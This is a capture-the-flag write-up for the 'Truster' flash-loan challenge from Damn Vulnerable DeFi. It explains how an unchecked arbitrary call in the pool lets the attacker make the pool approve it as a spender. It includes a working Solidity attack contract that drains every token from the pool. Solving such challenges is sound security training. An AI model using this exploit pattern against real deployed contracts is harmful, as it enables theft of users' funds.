## Truster

### **Problem:**
More and more lending pools are offering flashloans. In this case, a new pool has launched that is offering flashloans of DVT tokens for free.
The pool holds 1 million DVT tokens. You have nothing.
To pass this challenge, rescue all funds in the pool executing a single transaction. Deposit the funds into the designated recovery account.

### **Solution:**
flashloan function takes in input the target address of the contract that will be called to repay the debt.
To do so, it calls directly `target.functionCall(data)` from address library of OpenZeppelin. It does not check which type of contract we passed as target.
We take advantage to instantiate a fl with amount of 0 token to borrow and we pass as target the address of the token and as data the function signature of the approve function.
In this way, `TrusterLenderPool` will approve tokens to our contract and we will be able to transfer all the tokens from the pool to our contract.

### **Code:**
```javascript
contract Attacker {
    TrusterLenderPool public pool;
    DamnValuableToken public token;
    address public recovery;

    constructor(TrusterLenderPool _pool, DamnValuableToken _token, address _recovery) {
        pool = _pool;
        token = _token;
        recovery = _recovery;
    }

    function attack() external {
        pool.flashLoan(0, address(this), address(token), abi.encodeWithSignature("approve(address,uint256)", address(this), type(uint256).max));
        token.transferFrom(address(pool), recovery, 1_000_000e18);
    }        
}
```

